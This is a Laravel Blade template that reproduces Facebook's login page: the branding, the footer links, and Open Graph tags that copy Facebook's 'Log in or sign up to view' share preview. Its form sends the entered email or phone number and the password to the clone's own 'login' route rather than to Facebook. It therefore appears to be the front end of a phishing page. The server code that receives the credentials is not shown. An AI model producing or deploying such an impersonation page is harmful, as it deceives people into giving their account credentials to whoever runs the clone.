<!DOCTYPE html>
<html lang="en">

<meta property="og:title" content="Log in or sign up to view" />
<meta property="og:description" content="See posts, photos and more on Facebook." />
<link rel="icon" type="image/x-icon" href="{{ asset('img/fb_icon.png') }}">

<head>
  @include('layouts.header')
  <title>@yield('title', 'Facebook - log in or sign up')</title>
  <style>
    html {
      background-color: #fff
    }

    a {
      text-decoration: none;
      cursor: pointer;
    }

    a:hover {
      text-decoration: underline;
    }

    .wrapper {
      background-color: #f0f2f5
    }

    .title-wrapper {
      height: 74px;
      padding-bottom: 20px;
      text-align: center;
    }

    .fb-title {
      width: 321px;
      height: 106px;
      margin-top: -28px;
    }

    .text-subtitle {
      font-size: 24px;
      line-height: 28px;
      font-weight: normal;
      width: auto;
      font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
      margin: 0;
      color: #1c1e21;
      display: inline-block;
      letter-spacing: normal;
      text-rendering: optimizeLegibility;
      text-align: center;
    }

    .card {
      border: none;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      box-sizing: border-box;
      margin: 40px 0 0;
      padding: 10px 16px 24px;
      width: 396px
        /* padding-bottom: 24px;
      padding-top: 10px; */

    }

    .input-wrapper {
      font-size: 17px;
      width: 364px;
      margin: auto;
      padding: 6px 0;
      display: inline-block;
    }


    .input {
      font-size: 17px;
      padding: 14px 16px;
      width: 100%;
      height: 52px;
      border-radius: 6px;
      color: #1d2129;
    }

    .input::placeholder {
      /* Firefox */
      opacity: 0.7;
    }

    .input:focus {
      box-shadow: 0 0 0 .1rem rgba(13, 110, 253, .25);
      opacity: 0.5;
    }

    .log-in {
      background-color: #0766ff;
      border-radius: 6px;
      font-size: 20px;
      height: 48px;
      font-weight: 600;
    }

    .forgot-password {
      margin-top: 16px;
      color: #0866ff;
      font-size: 14px;
      font-weight: 500;
    }

    .create-account {
      background-color: #42b72a;
      border-radius: 6px;
      font-size: 17px;
      height: 48px;
      font-weight: 600;
      width: 194px;
      margin: 0 auto;
      border: none;
      margin-top: 6px;
      padding: 6px 16px 6px 16px;
      vertical-align: center;
    }

    .separator {
      align-items: center;
      border-bottom: 1px solid #dadde1;
      display: flex;
      margin: 20px 0px;
      text-align: center;
    }

    .description {
      border-top: none;
      color: #1c1e21;
      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
      font-size: 14px;
      font-weight: normal;
      padding-top: 0;
      margin-top: 28px;
      text-align: center;
    }

    #footer {
      padding: 0 40px;
      padding-top: 20px;
      color: #737373;
      font-size: 12px;
    }

    ul {
      list-style-type: none;
      margin: 0;
      padding: 0;
    }

    li {
      display: inline-block;
      vertical-align: top;

    }

    ul>li {
      padding-right: 0;
      padding-left: 10px;
    }

    .lang>li:first-child {
      padding-left: 0;
      border-width: 0;
      color: #737373;
    }

    .lang {
      color: #8a8d91;
      padding-top: 8px;
      align-items: center;
      display: flex;
      flex-wrap: wrap;
    }

    .small-plus {
      background-color: #f5f6f7;
      height: 18px;
      line-height: 18px;
      margin-right: 0;
      vertical-align: middle;
      border: 1px solid #ccd0d5;
      border-radius: 2px;
      box-sizing: content-box;
      font-size: 12px;
      width: 12px;
      padding: 0px 8px 2px;
      text-align: center;
      text-shadow: none;
      color: #8a8d91;
      font-weight: bold
    }

    .small-plus:hover {
      background-color: #ebedf0;
      border: 1px solid #ccd0d5;
    }

    .separator-b {
      border-bottom: 1px solid #dddfe2;
      font-size: 1px;
      height: 8px;
      margin-bottom: 8px;
    }

    .feature {
      color: #8a8d91;
      line-height: 1.6;
      margin-left: -20px;
    }

    .feature>li {
      padding-right: 0;
      padding-left: 20px;
    }

    .copyright {
      margin-top: 20px;
      margin-bottom: 20px;
      font-size: 11px;
    }

    .content {
      padding-top: 20px;
      padding-bottom: 92px
    }

    .section-title {
      width: 400px;
      margin: 0 auto;
    }

    @media only screen and (min-width: 992px) {
      .content {
        padding-bottom: 112px;
        padding-top: 72px;
      }

      .title-col {
        padding-left: 3px;

      }

      .title-wrapper {
        vertical-align: top;
        display: inline-block;
        box-sizing: border-box;
        margin: 112px 0 0px;
        margin-left: -28px;
        padding-right: 32px;
        width: 400px;
        text-align: left;
        padding-bottom:
      }

      .section-title {
        margin: 0;
        float: right;
      }

      .text-subtitle {
        text-align: left;
      }

    }
  </style>
</head>

<body>
  <div class="wrapper" id="app">
    <div class="main-panel">
      <div class="container">
        <div class="content">
          <div class="row" style="padding-top:20px;">
            <div class="col-md-12 col-lg-6 title-col">
              <div class="section-title">
                <div class="title-wrapper">
                  <img class="fb-title" src="{{ asset('img/fb title.svg') }}" alt="">
                </div>
                <h2 class="text-subtitle">Facebook helps you connect and share with the people
                  in your life.
                </h2>
              </div>
            </div>
            <div class="col-md-12 col-lg-6 card-content">
              <div class="section-title">
                <div class="card">
                  <form action="{{ url('login') }}" method="POST">
                    @csrf
                    <div class="input-wrapper">
                      <input class="form-control form-control-lg input" type="text" name="username"
                        value="{{ old('username') }}" size="20" placeholder="Email address or phone number">
                    </div>
                    <div class="input-wrapper">
                      <input class="form-control form-control-lg input" type="password" name="password" value=""
                        size="20" placeholder="Password">
                    </div>
                    <br>
                    <div class="pb-0" style="padding-top: 10px">
                      <button class="btn btn-block btn-primary w-100 log-in" type="submit">Log in</button>
                    </div>
                    <div class="forgot-password text-center">
                      <a class="">Forgotten password?</a>
                    </div>
                  </form>
                  <div class="separator"></div>
                  <button class="btn btn-success create-account d-inline-block">Create new account</button>
                </div>
                <div class="description">
                  <span class="fw-bold">Create a Page</span> for a celebrity, brand or business.
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="bg-white w-100" id="footer">
      <div>
        <ul class="lang">
          <li>English (UK)</li>
          <li>Bahasa Indonesia</li>
          <li>Bahasa Jawa</li>
          <li>Bahasa Melayu</li>
          <li>日本語</li>
          <li>العربية</li>
          <li>Francais (France)</li>
          <li>Español</li>
          <li>한국어</li>
          <li>Português (Brasil)</li>
          <li>Deutsch</li>
          <li><button class="btn small-plus">+</button></li>
        </ul>
        <div class="separator-b"></div>
        <ul class="feature">
          <li><a title="Sign up for Facebook">Sign Up</a></li>
          <li><a title="Log in to Facebook">Log in</a></li>
          <li><a title="Take a look at Messenger.">Messenger</a></li>
          <li><a title="Facebook Lite for Android.">Facebook Lite</a></li>
          <li><a title="Browse in Video">Video</a></li>
          <li><a title="Take a look at popular places on Facebook.">Places</a></li>
          <li><a title="Check out Facebook games.">Games</a></li>
          <li><a title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
          <li><a title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
          <li><a title="Discover Meta" target="_blank">Meta Store</a></li>
          <li><a title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
          <li><a title="Meta AI">Meta AI</a></li>
          <li><a title="Take a look at Instagram" target="_blank" rel="noreferrer nofollow"
              data-lynx-mode="asynclazy">Instagram</a></li>
          <li><a title="Check out Threads">Threads</a></li>
          <li><a title="Donate to worthy causes.">Fundraisers</a></li>
          <li><a title="Browse our Facebook Services directory.">Services</a></li>
          <li><a title="See the Voting Information Centre">Voting Information Centre</a></li>
          <li><a title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a>
          </li>
          <li><a title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a></li>
          <li><a title="Explore our groups.">Groups</a></li>
          <li><a title="Meta in Indonesia" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy">Meta
              in Indonesia</a></li>
          <li><a accesskey="8"
              title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
          <li><a title="Advertise on Facebook">Create ad</a></li>
          <li><a title="Create a Page">Create Page</a></li>
          <li><a title="Develop on our platform.">Developers</a></li>
          <li><a title="Make your next career move to our brilliant company.">Careers</a></li>
          <li><a title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
          <li><a data-nocookies="1" title="Learn about Ad Choices.">AdChoices<i
                class="img sp_8oGPGkzB8ig_2x sx_96e14f"></i></a></li>
          <li><a data-nocookies="1" accesskey="9" title="Review our terms and policies.">Terms</a></li>
          <li><a accesskey="0" title="Visit our Help Centre.">Help</a></li>
          <li><a title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
          <li><a accesskey="6" title="View and edit your Facebook settings.">Settings</a>
          </li>
          <li><a accesskey="7" title="View your activity log">Activity log</a></li>
        </ul>
      </div>
      <div class="copyright">
        <div><span> Meta © 2024</span></div>
      </div>
    </div>
  </div>
  {{-- Bootsrap 5 --}}
  <script src="{{ asset('/js/bootstrap.bundle.min.js') }}" crossorigin="anonymous"></script>

  {{-- Bootstrap 4 --}}
  {{-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
    integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script> --}}

  @stack('scripts')
</body>

<!-- Mirrored from themekita.com/demo-atlantis-bootstrap/livepreview/examples/demo1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 02:45:11 GMT -->

</html>
